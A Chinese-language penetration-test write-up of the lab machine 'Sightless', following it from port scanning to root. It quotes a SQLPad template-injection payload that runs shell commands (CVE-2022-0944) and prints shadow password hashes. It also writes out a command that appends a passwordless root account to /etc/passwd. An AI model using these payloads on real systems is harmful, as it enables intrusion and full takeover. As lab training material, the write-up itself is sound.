# 记一次渗透测试实战之Sightless-先知社区

> **来源**: https://xz.aliyun.com/news/16715  
> **文章ID**: 16715

---

# 信息收集

## 端口扫描

使用nmap进行端口探测，发现存在21、22、80端口开放。

![image.png](images/20250213154221-0f0a47cf-e9de-1.png)

## FTP未授权访问

尝试21端口未授权访问。

![image.png](images/20250213154223-0fe15986-e9de-1.png)

## 目录爆破

使用工具进行爆破目录。

![image.png](images/20250213154224-10c1bbf7-e9de-1.png)

未发现有用的路径，接着尝试访问80端口。

## Web网站

访问主页

![image.png](images/20250213154226-11c97292-e9de-1.png)

发现存在一个数据库调用页面

![image.png](images/20250213154227-1296e87c-e9de-1.png)

右上角有一个与连接交互的菜单：

![image.png](images/20250213154228-13351dc1-e9de-1.png)

## Google搜索

使用google搜索cve漏洞。

![image.png](images/20250213154229-13d7550d-e9de-1.png)

# 漏洞利用

## CVE-2022-0944

漏洞简介

```
Description
Please enter a description of the vulnerability.

Proof of Concept
Run a local docker instance
sudo docker run -p 3000:3000 --name sqlpad -d --env SQLPAD_ADMIN=admin --env SQLPAD_ADMIN_PASSWORD=admin sqlpad/sqlpad:latest
Navigate to http://localhost:3000/
Click on Connections->Add connection
Choose MySQL as the driver
Input the following payload into the Database form field
{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
Execute the following command to confirm the /tmp/pwn file was created in the container filesystem
sudo docker exec -it sqlpad cat /tmp/pwn
Impact
An SQLPad web application user with admin rights is able to run arbitrary commands in the underlying server.
```

![image.png](images/20250213154230-148a7c3c-e9de-1.png)

## 远程代码执行

使用nc监听。

![image.png](images/20250213154231-152dda80-e9de-1.png)

接着使用poc进行攻击，即可获取webshell。

![image.png](images/20250213154232-15ab9f1a-e9de-1.png)

# 内网渗透

## Docker

发现运行在一个docker容器里面。

![image.png](images/20250213154233-1632dc2c-e9de-1.png)

发现有两个用户的主目录位于`/home`​

![image.png](images/20250213154234-16e62c14-e9de-1.png)

## 恢复密码

将查到的密码保存之后，进行恢复。

![image.png](images/20250213154236-17f29a8e-e9de-1.png)

```
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b. michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

接着进行hash爆破，成功获取用户密码。

![image.png](images/20250213154238-18fce6f8-e9de-1.png)

## SSH登录

接着使用该密码进行登录ssh。

![image.png](images/20250213154240-1a22f052-e9de-1.png)

登录之后，获取user.txt.

![image.png](images/20250213154241-1af4ce56-e9de-1.png)![image.png](images/20250213154243-1bcc568b-e9de-1.png)

发现michael 用户无法运行`sudo`​

![image.png](images/20250213154244-1cf17d21-e9de-1.png)

## 寻找默认文件

查看默认配置

![image.png](images/20250213154247-1e7dabad-e9de-1.png)

发现存在8000端口。

![image.png](images/20250213154249-1fcc13ae-e9de-1.png)

## 隧道搭建

接着使用ssh进行端口转发。

![image.png](images/20250213154252-212a2967-e9de-1.png)

然后访问8000端口。

![image.png](images/20250213154253-21c107ed-e9de-1.png)

发现一个登录页面。

![image.png](images/20250213154254-226a298c-e9de-1.png)

抓包尝试。

![image.png](images/20250213154255-2382a90f-e9de-1.png)

## Chrome 调试

查找调试端口

在`chrome`进程中，它使用 将调试端口设置为 0。`--remote-debugging-port=0`这意味着每次启动时它都会是一个随机的高端口。我将检查`netstat`：

![image.png](images/20250213154258-24bf3f33-e9de-1.png)

获取密码

单击第一行的“检查”将启动一个窗口，显示开发工具中的活动。

![image.png](images/20250213154259-255c646b-e9de-1.png)

## CVE-2024-34070

漏洞简介：

Froxlor 是一款开源服务器管理软件。在 2.1.9 之前，Froxlor 应用程序的失败登录尝试日志记录功能中发现了一个存储盲跨站点脚本 (XSS) 漏洞。未经身份验证的用户可以在登录尝试时在 loginname 参数中注入恶意脚本，然后当管理员在系统日志中查看时，该脚本将被执行。通过利用此漏洞，攻击者可以执行各种恶意操作，例如在管理员不知情或未经同意的情况下强迫管理员执行操作。例如，攻击者可以强迫管理员添加由攻击者控制的新管理员，从而使攻击者完全控制应用程序。此漏洞已在 2.1.9 中修复。

![image.png](images/20250213154300-26192e9d-e9de-1.png)

发现是PHP8.1.2

![image.png](images/20250213154301-26f405cc-e9de-1.png)

# 权限提升

## PHP FPM远程代码执行

发现有一处功能点可执行命令

![image.png](images/20250213154303-27f55b87-e9de-1.png)

写入反弹shell脚本。

```
echo "echo '0dayhp::0:0:0test1:/root:/bin/bash' >> /etc/passwd">test.sh
```

![image.png](images/20250213154305-28ef0303-e9de-1.png)

然后保存之后，运行。

![image.png](images/20250213154306-29d985f0-e9de-1.png)

![image.png](images/20250213154308-2b1195ba-e9de-1.png)

## 获取root权限

成功获取root权限

![image.png](images/20250213154311-2cc21c1c-e9de-1.png)
